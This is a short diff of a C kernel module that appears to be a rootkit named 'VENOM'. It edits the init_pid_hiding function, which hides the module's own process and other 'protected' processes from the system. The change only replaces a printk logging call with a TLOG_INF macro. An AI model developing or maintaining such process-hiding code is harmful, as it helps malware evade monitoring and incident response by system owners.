@@ -99,8 +99,7 @@ notrace static void hide_protected_processes(void) {
 static void init_pid_hiding(void) {
     add_hidden_pid(current->pid);
     hide_protected_processes();
-    printk(KERN_INFO "[VENOM] PID hiding initialized: %d PIDs hidden\n", g_hidden_pid_count);
+    TLOG_INF("[VENOM] PID hiding initialized: %d PIDs hidden\n", g_hidden_pid_count);
 }
 
 #endif 
-
